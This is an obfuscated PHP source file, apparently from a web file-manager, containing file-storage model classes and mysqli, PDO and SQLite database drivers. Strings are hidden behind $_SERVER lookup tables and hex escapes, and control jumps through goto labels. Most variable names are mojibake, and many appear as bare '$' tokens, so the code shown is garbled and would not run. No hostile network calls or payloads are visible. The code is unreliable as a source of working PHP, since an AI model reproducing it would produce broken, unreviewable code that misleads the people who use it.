$Íòã = array_remove_value($Íòã, $[222]); if (!$Íòã) { return; } $ = $this->where(array($[1913] => array($[17], $Íòã)))->select(); $ = array_to_keyvalue($, $[1920]); foreach ($ as &$⁄§) { if (isset($[$⁄§[$[1912]]])) { $⁄§[$[1930]] = $[$⁄§[$[1912]]]; } } unset($⁄§); } private function _listAppendUser(&$«å) { $ =& $_SERVER[]; $ƒ∂ = array_unique(array_to_keyvalue($«å, $[22], $[1685])); $ƒ∂ = array_remove_value($ƒ∂, $[222]); if (count($ƒ∂) == 0) { return; } foreach ($«å as $ÈÉï) { if (isset($ÈÉï[$[1930]])) { $ƒ∂[] = $ÈÉï[$[1930]][$[1685]]; } } $ = Model($[576])->userListInfo($ƒ∂); foreach ($«å as &$ÈÉï) { $ÈÉï[$[639]] = $[$ÈÉï[$[1685]]]; if (isset($ÈÉï[$[1930]])) { $ÈÉï[$[1930]][$[639]] = $[$ÈÉï[$[1930]][$[1685]]]; } } unset($ÈÉï); } private function _listAppendMeta(&$) { $—ü =& $_SERVER[]; $ = array_unique(array_to_keyvalue($, $—ü[22], $—ü[1920])); $ = array_remove_value($, $—ü[222]); if (!$) { return; } foreach ($ as $ øŸ†) { if (isset($ øŸ†[$—ü[1930]])) { $[] = $ øŸ†[$—ü[1930]][$—ü[1920]]; } } $∆µ = $this->metaList($); if (!$∆µ) { return !1; } foreach ($ as &$ øŸ†) { $ øŸ†[$—ü[516]] = $∆µ[$ øŸ†[$—ü[1920]]]; if (isset($ øŸ†[$—ü[1930]])) { $ øŸ†[$—ü[1930]][$—ü[516]] = $∆µ[$ øŸ†[$—ü[1930]][$—ü[1920]]]; } } unset($ øŸ†); } private function metaList($) { $Ó£© =& $_SERVER[]; if (!$) { return array(); } $›Ü›ë = array($Ó£©[1920] => array($Ó£©[17], $)); $ = Model($Ó£©[1931])->where($›Ü›ë)->select(); $ = array_to_keyvalue_group($, $Ó£©[1920]); foreach ($ as $‚ó¥ => $÷Ñ) { $‡πö = array(); foreach ($÷Ñ as $…≥) { $‡πö[$…≥[$Ó£©[104]]] = $…≥[$Ó£©[427]]; } $[$‚ó¥] = $‡πö; } return $ ? $ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145\x5f\143\157\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\x54\151\x6d\145", "\164\151\x6d\145", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\151\x6f\137\146\x69\x6c\x65\x5f\155\145\x74\141", "\x6d\145\164\x61\106\151\145\154\x64" => "\146\151\154\145\x49\x44"); public function fileInfo($ŒÆ) { $⁄† =& $_SERVER[]; static $…é = array(); if (!isset($…é[$ŒÆ])) { $‡πù = $⁄†[1932]; $ﬂù = Model($⁄†[521])->field($‡πù)->where(array($⁄†[519] => $ŒÆ))->find(); $…é[$ŒÆ] = $ﬂù; } return $…é[$ŒÆ]; } public function addFileByContent($—Ñ = '', $“™Ÿ∞ = '') { $‹ª =& $_SERVER[]; $ÛÇéÑ = TEMP_PATH . $‹ª[1933]; if (!is_dir($ÛÇéÑ)) { mk_dir($ÛÇéÑ); } $ = $ÛÇéÑ . $‹ª[1934] . rand_string(16); file_put_contents($, $—Ñ); $ = $this->addFile($, $“™Ÿ∞, !0); if (file_exists($)) { @unlink($); } return $; } public function createFileName($, $ = false, $Úûòã = false) { $ =& $_SERVER[]; $ = IO::init($[18]); $‰©Ñ = $this->makeFilePath($, $, $, $Úûòã); $À§ = $->pathFather($‰©Ñ); static $ = false; $›´ = $[1935] . md5($À§); if (!$ && !Cache::get($›´)) { $ = !0; $√Ñ = IO::mkdir($À§); if (!IO::exist($√Ñ . $[837])) { IO::mkfile($√Ñ . $[837]); } Cache::set($›´, 1, 3600 * 2); } return $‰©Ñ; } public function makeFilePath($’ó, $, $Úëßø = false, $ = false) { $‹¢ =& $_SERVER[]; $›Ü = Model($‹¢[810])->get($‹¢[1936]); $ = KodIO::defaultIO() . date($‹¢[1937]); $Óßø = $ . rand_string(5) . short_id(100); $’ó = str_replace($‹¢[18], $‹¢[21], KodIO::clear($’ó)); $ƒ± = $->ext($’ó); if (!$’ó) { $›Ü = $‹¢[1938]; } switch ($›Ü) { case $‹¢[1939]: $Óßø = $Óßø . $‹¢[20] . $->ext($’ó); if ($ƒ± == $‹¢[1876]) { $Óßø .= $‹¢[1247]; } break; case $‹¢[1940]: $Œü = Model($‹¢[810])->get($‹¢[811]); $ƒ∑ = substr(md5($‹¢[812] . $Œü . date($‹¢[788])), 0, 8); $„´à = KodIO::defaultDriver(); $ = $‹¢[1278] . $„´à[$‹¢[452]] . $‹¢[461] . date($‹¢[1941]) . $ƒ∑ . $‹¢[18]; if ($ƒ± == $‹¢[1876]) { $’ó .= $‹¢[1247]; } $ÿ∑ = $‹¢[1942] . $ . $’ó; CacheLock::lock($ÿ∑); $Óßø = $ . $’ó; if (IO::exist($ . $’ó)) { $÷¥ = substr($’ó, 0, strlen($’ó) - strlen($ƒ±)); $ = $ ? substr($, 0, 5) : ($Úëßø ? substr($Úëßø, 0, 5) : rand_string(5)); $Óßø = $ . $÷¥ . $ . $‹¢[20] . $ƒ±; } if (IO::isTypeObject($Óßø) && !IO::isUploadServer($Óßø)) { if (IO::exist($Óßø)) { return $Óßø; } $ = IO::setContent($Óßø, $‹¢[22]); if (!$) { show_json($‹¢[1943], !1); } } CacheLock::unlock($ÿ∑); break; case $‹¢[1938]: break; default: break; } return $Óßø; } public function addFileByRemote($“û, $ÂØü, $Ã± = array()) { $ =& $_SERVER[]; if (!IO::exist($“û)) { return !1; } $Œà = $Ã±[$[650]] ? $Ã±[$[650]] : $[22]; $ = IO::hashMd5($“û, $Œà); $Ãò = KodIO::defaultDriver(); $Ã• = array($[594] => IO::size($“û), $[1944] => 1, $[471] => $ÂØü, $[848] => $Ãò[$[452]], $[472] => $“û, $[1945] => $Ã±[$[649]] ? $Ã±[$[649]] : IO::hashSimple($“û), $[1946] => $ ? $ : $Œà); if ($ = $this->addFileCheckExist($Ã•[$[649]], $Ã•[$[650]], $Ã•[$[86]])) { return $; } return $this->addFileData($Ã•); } private function addFileData($√ì) { $ =& $_SERVER[]; if (!$√ì) { return !1; } $√ì[$[86]] = intval($√ì[$[86]]); if (!$√ì[$[86]] && strlen($√ì[$[649]]) > 32) { $√ì[$[86]] = intval(substr($√ì[$[649]], 32)); } $ = $this->add($√ì); return $this->find($); } public function addFile($, $»Ø, $‘Ç = false) { $Ã≥ =& $_SERVER[]; $ = IO::hashSimple($); $ = IO::size($); $Àë = $ <= 1024 * 1024 * 10 ? IO::hashMd5($) : $Ã≥[22]; $ ô‡•π = $Ã≥[1947] . $; CacheLock::lock($ ô‡•π); if ($Àë && $) { $€π = $this->addFileCheckExist($, $Àë, $); if ($€π) { CacheLock::unlock($ ô‡•π); return $€π; } } $Œü = $this->addFileMake($, $, $, $Àë, $»Ø, $‘Ç); $Õ™„õç = $this->addFileData($Œü); CacheLock::unlock($ ô‡•π); if (!$Àë && $Õ™„õç) { $this->fileMd5Check($Õ™„õç); } return $Õ™„õç; } private function fileMd5Check($›≥) { $ =& $_SERVER[]; $Ãã = array($›≥[$[518]], $›≥[$[94]]); $ƒ† = $[1948] . $›≥[$[94]]; $ = $[1949] . $›≥[$[518]]; $‹à = TaskQueue::add($[1950], $Ãã, $ƒ†, $); if (!$‹à) { $this->fileMd5Set($›≥[$[518]], $›≥[$[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($’ä, $) { $Áâö =& $_SERVER[]; $ = $this->find($’ä); if (!$ || $[$Áâö[650]]) { return; } $–í = IO::hashMd5($); if (!$–í) { return $Áâö[22]; } $this->where(array($Áâö[518] => $’ä))->save(array($Áâö[650] => $–í)); } public function addFileMake($€°, $, $÷õ÷á, $, $‡¢º, $) { $Ÿ† Ø =& $_SERVER[]; $Ë°± = $this->createFileName($‡¢º, $÷õ÷á, $); $ = get_path_father($Ë°±); $—õ = get_path_this($Ë°±); if ($) { $¬ú = IO::move($€°, $, !1, $—õ); } else { $¬ú = IO::copy($€°, $, !1, $—õ); } if (!$¬ú) { return !1; } $ = KodIO::defaultDriver(); $«ò = array($Ÿ† Ø[594] => $, $Ÿ† Ø[1944] => 1, $Ÿ† Ø[471] => $‡¢º, $Ÿ† Ø[848] => $[$Ÿ† Ø[452]], $Ÿ† Ø[472] => $Ë°±, $Ÿ† Ø[1945] => $÷õ÷á, $Ÿ† Ø[1946] => $); return $«ò; } public function addFileCheckExist($œÆ, $ÿù, $) { $‰è¶ =& $_SERVER[]; $«ú = $this->findByHash($œÆ, $ÿù); if (!$«ú) { return !1; } $òßà = array($‰è¶[1944] => intval($«ú[$‰è¶[1951]]) + 1, $‰è¶[594] => $); $this->where(array($‰è¶[519] => $«ú[$‰è¶[518]]))->save($òßà); return $«ú; } public function remove($ ∏) { $this->linkCountChange($ ∏, !1); $this->clearEmpty(); return !0; } public function linkAdd($÷º) { $this->linkCountChange($÷º, !0); } public function linkCountChange($, $) { $ =& $_SERVER[]; if (!$) { return; } if (!is_array($)) { $ = array($); } $◊ù = array(); foreach ($ as $Àö) { $“Å = $Àö . $[22]; if (!$◊ù[$“Å]) { $◊ù[$“Å] = 0; } $◊ù[$“Å]++; } $œå’≥ = array(); foreach ($◊ù as $Àö => $ËÇè) { $“Å = $ËÇè . $[22]; if (!$œå’≥[$“Å]) { $œå’≥[$“Å] = array(); } $œå’≥[$“Å][] = $Àö; } foreach ($œå’≥ as $ËÇè => $«ö) { if (!$«ö) { continue; } $ËÇè = $ ? $ËÇè : -intval($ËÇè); $ = array($[518] => array($[17], $«ö)); if ($ËÇè < 0) { $[$[1951]] = array($[1056], abs($ËÇè)); } $this->where($)->setAdd($[1951], $ËÇè); } } public function findByHash($, $ = false) { $…Ø =& $_SERVER[]; if (!$ && !$) { return !1; } $ = array($…Ø[1945] => $); if ($) { $ = array($…Ø[1946] => $); } return $this->order($…Ø[1952])->where($)->find(); } public function clearEmpty($ÕÆ = 0) { $€º =& $_SERVER[]; $ òÏøÜ = time() - 3600 * 24 * $ÕÆ; $ = $€º[1953] . $ òÏøÜ; $ = $this->where($)->select(); if (!$) { return; } $ = new Task($€º[1954], $€º[22], count($)); foreach ($ as $·ùñƒ∏) { $->update(1); $this->resetFile($·ùñƒ∏); } $->end(); } public function resetFile($) { $ =& $_SERVER[]; $÷§ = array($[519] => $[$[518]]); $≈™ = Model($[1373])->where($÷§)->count(); $ﬁß”£ = Model($[1955])->where($÷§)->count(); $ = intval($≈™) + intval($ﬁß”£); if ($ == 0) { IO::remove($[$[94]]); Model($[1956])->delete($[$[518]]); $this->where($÷§)->delete(); $this->metaSet($[$[518]], null, null); return; } if ($[$[1951]] != $) { $this->where($÷§)->save(array($[1944] => $)); } } public function storageInfo($ = false) { $¬Æ =& $_SERVER[]; $ = $this->count() + 0.0; $ﬁß = 0; $ = 1; $ = 0; $ = 5000; for ($—∑ = 0; $—∑ < $; $—∑ = $—∑ + $) { $Ï´î = $this->limit($—∑, $—∑ + $)->select(); foreach ($Ï´î as $) { $ += $[$¬Æ[86]] * $[$¬Æ[1951]]; $ﬁß += $[$¬Æ[86]] * ($[$¬Æ[1951]] - 1); $ += $[$¬Æ[1951]]; } } $Óüã = array($¬Æ[1957] => $, $¬Æ[1958] => $ﬁß, $¬Æ[1959] => $ﬁß / $, $¬Æ[90] => $, $¬Æ[1960] => $); return $Óüã; } } goto F; C: class DbMysqli extends Db { public function __construct($Õµ = '') { $√Çƒ± =& $_SERVER[]; if (!extension_loaded($√Çƒ±[953])) { think_exception(think_lang($√Çƒ±[24]) . $√Çƒ±[954]); } if (!empty($Õµ)) { $this->config = $Õµ; if (empty($this->config[$√Çƒ±[27]])) { $this->config[$√Çƒ±[27]] = $√Çƒ±[22]; } } } public function connect($…ë = '', $ Æ = 0) { $ =& $_SERVER[]; if (!isset($this->linkID[$ Æ])) { if (empty($…ë)) { $…ë = $this->config; } $this->linkID[$ Æ] = new mysqli($…ë[$[927]], $…ë[$[929]], $…ë[$[930]], $…ë[$[31]], $…ë[$[928]] ? intval($…ë[$[928]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $’¢ = $this->linkID[$ Æ]->server_version; $this->linkID[$ Æ]->query($[931] . think_config($[932]) . $[68]); if ($’¢ > $[933]) { $this->linkID[$ Æ]->query($[934]); } $this->connected = !0; if (1 != think_config($[32])) { unset($this->config); } } return $this->linkID[$ Æ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($…µ) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…µ; if ($this->queryID) { $this->free(); } think_action_status($[33], 1); think_status($[34]); $this->queryID = $this->_linkID->query($…µ); if ($this->_linkID->more_results()) { while (($ = $this->_linkID->next_result()) != NULL) { $->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‘°) { $È§∑ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘°; if ($this->queryID) { $this->free(); } think_action_status($È§∑[35], 1); think_status($È§∑[34]); $ = $this->_linkID->query($‘°); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $ = array(); if ($this->numRows > 0) { for ($ = 0; $ < $this->numRows; $++) { $[$] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $; } public function getFields($∆â) { $Ãç =& $_SERVER[]; $ = $this->query($Ãç[938] . $this->parseKey($∆â)); $ = array(); if ($) { foreach ($ as $Ê±ù => $ﬁ¢) { $[$ﬁ¢[$Ãç[41]]] = array($Ãç[42] => $ﬁ¢[$Ãç[41]], $Ãç[43] => $ﬁ¢[$Ãç[44]], $Ãç[45] => (bool) ($ﬁ¢[$Ãç[46]] === $Ãç[22]), $Ãç[47] => $ﬁ¢[$Ãç[48]], $Ãç[49] => strtolower($ﬁ¢[$Ãç[50]]) == $Ãç[51], $Ãç[52] => strtolower($ﬁ¢[$Ãç[53]]) == $Ãç[54]); } } return $; } public function getTables($Ã£ = '') { $Õ≥”ô =& $_SERVER[]; $ = !empty($Ã£) ? $Õ≥”ô[940] . $Ã£ . $Õ≥”ô[941] : $Õ≥”ô[942]; $·ï´ = $this->query($); $ = array(); if ($·ï´) { foreach ($·ï´ as $’© => $œ•) { $[$’©] = current($œ•); } } return $; } public function replace($ÎÇè, $Ÿç = array()) { $Àµ =& $_SERVER[]; foreach ($ÎÇè as $ => $ﬁî) { $»ú = $this->parseValue($ﬁî); if (is_scalar($»ú)) { $ õ[] = $»ú; $√∏[] = $this->parseKey($); } } $Àâ‰ó± = $Àµ[943] . $this->parseTable($Ÿç[$Àµ[332]]) . $Àµ[944] . implode($Àµ[60], $√∏) . $Àµ[945] . implode($Àµ[60], $ õ) . $Àµ[946]; return $this->execute($Àâ‰ó±); } public function insertAll($, $Í±∑ = array(), $◊± = false) { $ =& $_SERVER[]; if (!is_array($[0])) { return !1; } $Ã≠ŸÑ = array_keys($[0]); $ = array(); foreach ($ as $÷ø) { $√≥ = array(); foreach ($÷ø as $ => $) { $ = $this->parseValue($); if (is_scalar($)) { $√≥[] = $; } } $[] = $[313] . implode($[60], $√≥) . $[946]; } array_walk($Ã≠ŸÑ, array($this, $[947])); $ • = $◊± ? $[948] : $[949]; $Ÿå = $ • . $[950] . $this->parseTable($Í±∑[$[332]]) . $[944] . implode($[60], $Ã≠ŸÑ) . $[951] . implode($[60], $); return $this->execute($Ÿå); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $”ô–Ç =& $_SERVER[]; $this->error = $this->_linkID->errno . $”ô–Ç[4] . $this->_linkID->error; if ($”ô–Ç[22] != $this->queryStr) { $this->error .= LNG($”ô–Ç[58]) . $this->queryStr; } think_trace($this->error, $”ô–Ç[22], $”ô–Ç[59]); return $this->error; } public function escapeString($ﬂ£Ÿà) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ﬂ£Ÿà); } else { return addslashes($ﬂ£Ÿà); } } public function parseKey(&$, $ = true) { $ =& $_SERVER[]; if ($) { $ = $this->parseKeyCheck($); } if ($ != $[213] && !preg_match($[952], $)) { $ = $[438] . trim($, $[438]) . $[438]; } return $; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($„∏Ø = '') { $√¶ =& $_SERVER[]; if (!class_exists($√¶[955])) { think_exception(think_lang($√¶[24]) . $√¶[956]); } if (!empty($„∏Ø)) { $this->config = $„∏Ø; if (empty($this->config[$√¶[27]])) { $this->config[$√¶[27]] = array(); } } } public function connect($Í≥ï = '', $ = 0) { $ =& $_SERVER[]; if (!isset($this->linkID[$])) { if (empty($Í≥ï)) { $Í≥ï = $this->config; } $ = !empty($Í≥ï[$[27]][$[28]]) ? $Í≥ï[$[27]][$[28]] : $this->pconnect; if ($) { $Í≥ï[$[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$] = new PDO($Í≥ï[$[957]], $Í≥ï[$[929]], $Í≥ï[$[930]], $Í≥ï[$[27]]); } catch (PDOException $„∂â) { think_exception($„∂â->getMessage()); } $this->dbType = $this->_getDsnType($Í≥ï[$[957]]); if (in_array($this->dbType, array($[958], $[959], $[960], $[961]))) { think_exception($[962] . $this->dbType . $[963] . $this->dbType . $[964]); } if (!$this->linkID[$]) { think_exception($[965]); } try { $this->linkID[$]->exec($[966] . think_config($[932])); } catch (Exception $„∂â) { } $this->connected = !0; if (1 != think_config($[32])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->PDOStatement = null; } public function query($, $ÂÜª = array()) { $ ï =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if (!empty($ÂÜª)) { $this->queryStr .= $ ï[967] . print_r($ÂÜª, !0) . $ ï[968]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ ï[33], 1); think_status($ ï[34]); $this->PDOStatement = $this->_linkID->prepare($); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $€∂ = $this->PDOStatement->execute($ÂÜª); $this->debug(); if (!1 === $€∂) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($, $Ÿç = array()) { $◊° =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if (!empty($Ÿç)) { $this->queryStr .= $◊°[967] . print_r($Ÿç, !0) . $◊°[968]; } $–∏ = !1; if ($this->dbType == $◊°[961]) { if (preg_match($◊°[969], $this->queryStr, $∆°)) { $this->table = think_config($◊°[970]) . str_ireplace(think_config($◊°[971]), $◊°[431], $∆°[2]); $–∏ = (bool) $this->query($◊°[972] . strtoupper($this->table) . $◊°[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($◊°[35], 1); think_status($◊°[34]); $this->PDOStatement = $this->_linkID->prepare($); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($Ÿç); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($–∏ || preg_match($◊°[973], $)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€Ö = $this->_linkID->commit(); $this->transTimes = 0; if (!$€Ö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $Ë¥Ä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ë¥Ä); return $Ë¥Ä; } public function getFields($) { $”• =& $_SERVER[]; $this->initConnect(!0); if (think_config($”•[974])) { $‹ø = str_replace($”•[975], $, think_config($”•[974])); } else { switch ($this->dbType) { case $”•[958]: case $”•[976]: $‹ø = "\123\x45\114\x45\103\124\40\40\x20\143\x6f\154\x75\x6d\x6e\137\x6e\x61\155\145\40\141\x73\40\47\x4e\x61\155\145\47\54\x20\x20\x20\144\x61\164\141\x5f\x74\171\x70\x65\40\x61\x73\40\47\x54\x79\x70\x65\47\54\40\40\x20\143\x6f\154\x75\155\x6e\137\144\145\146\141\x75\154\x74\40\141\x73\40\x27\x44\145\146\x61\165\x6c\164\x27\x2c\x20\40\40\151\x73\x5f\x6e\x75\x6c\154\x61\x62\154\x65\40\141\x73\40\x27\116\165\x6c\x6c\47\xa\x9\11\106\x52\x4f\x4d\11\151\x6e\x66\x6f\162\155\x61\x74\x69\x6f\156\x5f\x73\x63\x68\145\155\141\x2e\164\x61\x62\x6c\145\163\40\101\x53\40\164\xa\x9\x9\112\x4f\x49\x4e\11\x69\156\x66\x6f\x72\155\141\x74\x69\x6f\156\x5f\x73\x63\x68\145\x6d\141\x2e\x63\157\154\165\x6d\156\x73\40\101\123\x20\143\12\x9\11\117\116\40\40\164\56\164\x61\x62\154\145\x5f\x63\141\164\x61\154\157\x67\40\75\x20\143\56\164\x61\x62\x6c\x65\137\143\141\164\x61\x6c\157\147\xa\x9\x9\101\116\x44\40\x74\x2e\164\x61\142\x6c\x65\x5f\163\x63\x68\145\155\x61\x20\75\40\143\x2e\x74\x61\x62\154\145\137\163\143\150\x65\x6d\x61\xa\11\11\x41\x4e\x44\x20\164\56\x74\x61\x62\x6c\x65\x5f\156\x61\x6d\x65\x20\75\x20\x63\56\x74\141\x62\154\145\137\156\x61\155\145\xa\x9\x9\127\x48\x45\122\x45\40\x20\40\x74\56\164\x61\x62\x6c\145\137\156\x61\x6d\145\x20\x3d\x20\x27{$}\x27"; break; case $”•[977]: $‹ø = $”•[978] . $ . $”•[979]; break; case $”•[959]: case $”•[961]: $‹ø = $”•[980] . $”•[981] . $”•[982] . strtoupper($) . $”•[983] . strtoupper($) . $”•[984]; break; case $”•[985]: $‹ø = $”•[986] . $ . $”•[987]; break; case $”•[960]: break; case $”•[988]: default: $‹ø = $”•[989] . ($this->dbType == $”•[988] ? "\x60{$}\140" : $); } } $–±∆¨ = $this->query($‹ø); $Ë≤∂’û = array(); if ($–±∆¨) { foreach ($–±∆¨ as $ => $‘´∆Ω) { $‘´∆Ω = array_change_key_case($‘´∆Ω); $‘´∆Ω[$”•[42]] = isset($‘´∆Ω[$”•[42]]) ? $‘´∆Ω[$”•[42]] : $”•[431]; $‘´∆Ω[$”•[43]] = isset($‘´∆Ω[$”•[43]]) ? $‘´∆Ω[$”•[43]] : $”•[431]; $’° = isset($‘´∆Ω[$”•[326]]) ? $‘´∆Ω[$”•[326]] : $‘´∆Ω[$”•[42]]; $Ë≤∂’û[$’°] = array($”•[42] => $’°, $”•[43] => $‘´∆Ω[$”•[43]], $”•[45] => (bool) (isset($‘´∆Ω[$”•[113]]) && $‘´∆Ω[$”•[113]] === $”•[22] || isset($‘´∆Ω[$”•[45]]) && $‘´∆Ω[$”•[45]] === $”•[22]), $”•[47] => isset($‘´∆Ω[$”•[47]]) ? $‘´∆Ω[$”•[47]] : (isset($‘´∆Ω[$”•[66]]) ? $‘´∆Ω[$”•[66]] : $”•[431]), $”•[49] => isset($‘´∆Ω[$”•[104]]) ? strtolower($‘´∆Ω[$”•[104]]) == $”•[51] : (isset($‘´∆Ω[$”•[67]]) ? $‘´∆Ω[$”•[67]] : !1), $”•[52] => isset($‘´∆Ω[$”•[990]]) ? strtolower($‘´∆Ω[$”•[990]]) == $”•[54] : (isset($‘´∆Ω[$”•[104]]) ? $‘´∆Ω[$”•[104]] : !1)); } } return $Ë≤∂’û; } public function getTables($€ºÍµî = '') { $ =& $_SERVER[]; if (think_config($[991])) { $¬ñ÷ë = str_replace($[992], $€ºÍµî, think_config($[991])); } else { switch ($this->dbType) { case $[959]: case $[961]: $¬ñ÷ë = $[993]; break; case $[958]: case $[976]: $¬ñ÷ë = $[994]; break; case $[985]: $¬ñ÷ë = $[995]; break; case $[960]: think_exception(think_lang($[996]) . $[997]); break; case $[977]: $¬ñ÷ë = $[55] . $[56] . $[57]; break; case $[988]: default: if (!empty($€ºÍµî)) { $¬ñ÷ë = $[940] . $€ºÍµî . $[941]; } else { $¬ñ÷ë = $[942]; } } } $ŸØ = $this->query($¬ñ÷ë); $Î®ô = array(); foreach ($ŸØ as $Êçã => $·ñâ) { $Î®ô[$Êçã] = current($·ñâ); } return $Î®ô; } protected function parseLimit($ƒ∑) { $Œá =& $_SERVER[]; $”∑ = $Œá[22]; if (!empty($ƒ∑)) { switch ($this->dbType) { case $Œá[985]: case $Œá[977]: $ƒ∑ = explode($Œá[60], $ƒ∑); if (count($ƒ∑) > 1) { $”∑ .= $Œá[61] . $ƒ∑[1] . $Œá[62] . $ƒ∑[0] . $Œá[63]; } else { $”∑ .= $Œá[61] . $ƒ∑[0] . $Œá[63]; } break; case $Œá[958]: case $Œá[976]: break; case $Œá[960]: break; case $Œá[959]: case $Œá[961]: break; case $Œá[988]: default: $”∑ .= $Œá[61] . $ƒ∑ . $Œá[63]; } } return $”∑; } public function parseKey(&$ÃÜ, $ÿû = true) { $ =& $_SERVER[]; if ($ÿû) { $ÃÜ = $this->parseKeyCheck($ÃÜ); } if ($this->dbType == $[988]) { if ($ÃÜ != $[213] && !preg_match($[952], $ÃÜ)) { $ÃÜ = $[438] . trim($ÃÜ, $[438]) . $[438]; } return $ÃÜ; } else { return parent::parseKey($ÃÜ, $ÿû); } } public function close() { $this->_linkID = null; } public function error() { $À≤ =& $_SERVER[]; if ($this->PDOStatement) { $ = $this->PDOStatement->errorInfo(); $this->error = $[1] . $À≤[4] . $[2]; } else { $this->error = $À≤[22]; } if ($À≤[22] != $this->queryStr) { $this->error .= LNG($À≤[58]) . $this->queryStr; } think_trace($this->error, $À≤[22], $À≤[59]); return $this->error; } public function escapeString($≈ú) { $≈≠ =& $_SERVER[]; switch ($this->dbType) { case $≈≠[985]: case $≈≠[958]: case $≈≠[976]: case $≈≠[988]: return addslashes($≈ú); case $≈≠[960]: case $≈≠[977]: case $≈≠[959]: case $≈≠[961]: return str_ireplace($≈≠[68], $≈≠[69], $≈ú); } } protected function parseValue($◊ª) { $‘∞ =& $_SERVER[]; if (is_string($◊ª)) { $ = strpos($◊ª, $‘∞[4]) === 0 && in_array($◊ª, array_keys($this->bind)); $◊ª = $ ? $this->escapeString($◊ª) : $‘∞[998] . $this->escapeString($◊ª) . $‘∞[998]; } elseif (isset($◊ª[0]) && is_string($◊ª[0]) && strtolower($◊ª[0]) == $‘∞[350]) { $◊ª = $this->escapeString($◊ª[1]); } elseif (is_array($◊ª)) { $◊ª = array_map(array($this, $‘∞[999]), $◊ª); } elseif (is_bool($◊ª)) { $◊ª = $◊ª ? $‘∞[98] : $‘∞[222]; } elseif (is_null($◊ª)) { $◊ª = $‘∞[113]; } return $◊ª; } public function getLastInsertId() { $ =& $_SERVER[]; switch ($this->dbType) { case $[985]: case $[977]: case $[958]: case $[976]: case $[960]: case $[988]: return $this->_linkID->lastInsertId(); case $[959]: case $[961]: $ = $this->table; $ÊÖó = $this->query("\x53\x45\114\x45\103\124\x20{$}\x2e\x63\x75\x72\x72\x76\x61\154\x20\x63\x75\162\x72\x76\141\154\x20\106\122\x4f\x4d\40\144\165\x61\154"); return $ÊÖó ? $ÊÖó[0][$[1000]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($⁄ü) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[23])) { return !1; } $’™ = parent::query($⁄ü); CacheLock::fileUnLock($[23]); return $’™; } public function execute($œä∆£) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[23])) { return !1; } $√° = parent::execute($œä∆£); CacheLock::fileUnLock($[23]); return $√°; } } goto dÕÇ; BÛ±ëß: class DbSqlite3Base extends Db { public function __construct($ = '') { $Ïòº =& $_SERVER[]; if (!class_exists($Ïòº[64])) { think_exception(think_lang($Ïòº[24]) . $Ïòº[65]); } if (!empty($)) { if (!isset($[$Ïòº[26]])) { $[$Ïòº[26]] = 438; } $this->config = $; if (empty($this->config[$Ïòº[27]])) { $this->config[$Ïòº[27]] = array(); } } } public function connect($ = '', $√µ = 0) { $“Ö =& $_SERVER[]; if (!isset($this->linkID[$√µ])) { if (empty($)) { $ = $this->config; } $this->linkID[$√µ] = new SQLite3($[$“Ö[31]]); if (!$this->linkID[$√µ]) { think_exception($this->linkID[$√µ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$√µ]->busyTimeout(30000); if (1 != think_config($“Ö[32])) { unset($this->config); } } return $this->linkID[$√µ]; } public function free() { $this->queryID = null; } public function query($≈ö) { $€ó =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $≈ö; if ($this->queryID) { $this->free(); } think_action_status($€ó[33], 1); think_status($€ó[34]); $this->queryID = 